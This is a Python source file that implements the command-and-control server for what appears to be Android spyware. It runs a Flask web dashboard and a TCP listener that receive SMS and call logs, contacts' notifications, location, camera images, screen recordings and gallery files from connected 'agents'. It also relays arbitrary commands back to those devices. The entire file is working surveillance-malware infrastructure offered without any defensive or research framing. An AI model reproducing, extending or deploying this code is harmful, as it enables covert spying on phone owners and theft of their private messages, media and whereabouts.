import socket
import json
import threading
import base64
import os
import time
from flask import Flask, request, jsonify, render_template, send_from_directory
from werkzeug.utils import secure_filename

# --- Global Setup ---
app = Flask(__name__)
running = True
server_logs = []
clients = {}
clients_lock = threading.Lock()
file_transfers = {}

# Ensure folders exist
for folder in ['captured_images', 'device_downloads', 'screen_recordings', 'gallery_downloads']:
    if not os.path.exists(folder):
        os.makedirs(folder)

def add_log(message):
    timestamp = time.strftime("%H:%M:%S")
    formatted_msg = f"[{timestamp}] {message}"
    print(formatted_msg)
    server_logs.insert(0, formatted_msg)
    if len(server_logs) > 150: server_logs.pop()

def create_initial_ui_data():
    return {
        "sms_logs": [], "call_logs": [], "file_manager": {"path": "/", "files": []},
        "gallery": {"page": 0, "files": []}, "notifications": [], "apps": [],
        "device_info": {}, "location_url": None, "camera_image": None,
        "location_status": "idle", "location_image": None, "record_status": None, "last_video": None
    }

# --- TCP Handler ---
def handle_incoming_data(data, client_id):
    with clients_lock:
        if client_id not in clients: return
        try:
            payload = json.loads(data).get('data', {})
            log_type = payload.get('type', 'UNKNOWN')
            client_data = clients[client_id]['ui_data']

            handler_map = {
                'SMS_LOG': lambda p: client_data.update({'sms_logs': p.get('logs', [])}),
                'CALL_LOG': lambda p: client_data.update({'call_logs': p.get('logs', [])}),
                'DEVICE_INFO': lambda p: client_data['device_info'].update(p.get('info', {})),
                'APP_LIST': lambda p: client_data.update({'apps': p.get('apps', [])}),
                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager'].update(p.get("listing", {})),
                'NOTIFICATION_DATA': lambda p: client_data['notifications'].insert(0, p.get("notification", {})),
                'LOCATION_PENDING': lambda p: client_data.update({"location_status": "pending"}),
                'LOCATION_SUCCESS': lambda p: client_data.update({
                    "location_status": "success", 
                    "location_url": p.get("data", {}).get("url") if isinstance(p.get("data"), dict) else p.get("url"),
                    "location_image": p.get("data", {}).get("image_url") if isinstance(p.get("data"), dict) else None
                }),
                'LOCATION_FAIL': lambda p: client_data.update({"location_status": "error", "agent_messages": [p.get("error", "Unknown error")]}),
                'RECORD_STATUS': lambda p: client_data.update({"record_status": p.get("status")}),
                'RECORD_FAIL': lambda p: client_data.update({"record_status": "failed", "agent_messages": [p.get("error", "Record failed")]}),
                'GALLERY_PAGE_DATA': lambda p: client_data['gallery'].update(p.get("data", {})),
                'GALLERY_SCAN_COMPLETE': lambda p: add_log(f"[{client_id}] Gallery scan complete: {p.get('image_count')} images"),
                'WALLPAPER_STATUS': lambda p: client_data.update({"agent_messages": [p.get("status", "Wallpaper change triggered")]}),
                'SHELL_RENAME_SUCCESS': lambda p: add_log(f"[{client_id}] File renamed to {p.get('new_name')}"),
                'SHELL_DEL_SUCCESS': lambda p: add_log(f"[{client_id}] File deleted: {p.get('file')}"),
                'UPLOAD_SUCCESS': lambda p: add_log(f"[{client_id}] File uploaded: {p.get('file')}"),
            }

            if log_type in handler_map:
                handler_map[log_type](payload)
                add_log(f"[{client_id}] Received {log_type}")
            elif 'CHUNK' in log_type or 'END' in log_type:
                handle_file_transfer(payload, log_type, client_id)
        except Exception as e:
            add_log(f"[ERROR] Data Parsing: {e}")

def handle_file_transfer(payload, log_type, client_id):
    global file_transfers
    if 'CHUNK' in log_type:
        chunk_data = payload.get('chunk_data', {})
        filename = chunk_data.get('filename')
        if filename:
            file_transfers.setdefault(filename, []).append(chunk_data.get('chunk'))
    elif 'END' in log_type:
        filename = payload.get('file')
        if filename and filename in file_transfers:
            folder = 'captured_images' if (filename.endswith('.mp4') or 'CAMERA' in log_type) else 'device_downloads'
            save_path = os.path.join(folder, secure_filename(filename))
            try:
                full_base64_data = "".join(file_transfers.pop(filename))
                with open(save_path, 'wb') as f:
                    f.write(base64.b64decode(full_base64_data))
                add_log(f"[DOWNLOAD] Saved {filename}")
                with clients_lock:
                    if filename.endswith('.mp4'):
                        clients[client_id]['ui_data'].update({"last_video": filename, "record_status": "done"})
                    else:
                        clients[client_id]['ui_data']['camera_image'] = filename
            except Exception as e:
                add_log(f"[ERROR] Save File: {e}")

def handle_client_connection(conn, client_id):
    add_log(f"[+] Agent Connected: {client_id}")
    buffer = ""
    try:
        while True:
            data = conn.recv(16384).decode('utf-8', errors='ignore')
            if not data: break
            buffer += data
            while '\n' in buffer:
                line, buffer = buffer.split('\n', 1)
                if line.strip(): handle_incoming_data(line.strip(), client_id)
    except: pass
    finally:
        with clients_lock:
            if client_id in clients: del clients[client_id]
        add_log(f"[-] Agent Disconnected: {client_id}")
        conn.close()

def tcp_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8888))
    server.listen(10)
    add_log("[*] TCP Server listening on port 8888")
    while running:
        try:
            conn, addr = server.accept()
            client_id = f"{addr[0]}:{addr[1]}"
            with clients_lock:
                clients[client_id] = {'socket': conn, 'ui_data': create_initial_ui_data()}
            threading.Thread(target=handle_client_connection, args=(conn, client_id), daemon=True).start()
        except: pass

# --- Web Routes ---
@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/status')
def get_status():
    with clients_lock:
        client_list = []
        for cid, cd in clients.items():
            info = cd['ui_data'].get('device_info', {})
            client_list.append({'id': cid, 'model': info.get('Model', 'Unknown'), 'battery': info.get('Battery', 'N/A')})
    return jsonify({"logs": server_logs, "devices": client_list})

@app.route('/api/client_data/<client_id>')
def get_client_data(client_id):
    with clients_lock:
        if client_id in clients: return jsonify(clients[client_id]['ui_data'])
        return jsonify({"error": "not found"}), 404

@app.route('/api/command', methods=['POST'])
def send_command_route():
    req = request.json
    client_id, cmd = req.get('client_id'), req.get('cmd')
    with clients_lock:
        if client_id not in clients: return jsonify({"status": "error"}), 404
        client_data = clients[client_id]['ui_data']
        # State resets
        if cmd == 'get_location': client_data.update({"location_status": "requesting", "location_url": None})
        if 'record_' in cmd: client_data.update({"record_status": "Recording...", "last_video": None})
        try:
            clients[client_id]['socket'].sendall(f"{cmd}\n".encode())
            add_log(f"[SEND] {client_id}: {cmd}")
            return jsonify({"status": "success"})
        except Exception as e: return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/delete_file', methods=['POST'])
def delete_file_route():
    fn = request.json.get('filename')
    path = os.path.join('captured_images', secure_filename(fn))
    if os.path.exists(path):
        os.remove(path)
        return jsonify({"status": "success"})
    return jsonify({"status": "not found"}), 404

@app.route('/captured_images/<path:filename>')
def serve_image(filename): return send_from_directory('captured_images', filename)

if __name__ == '__main__':
    threading.Thread(target=tcp_listener, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    add_log(f"[*] Web Server starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
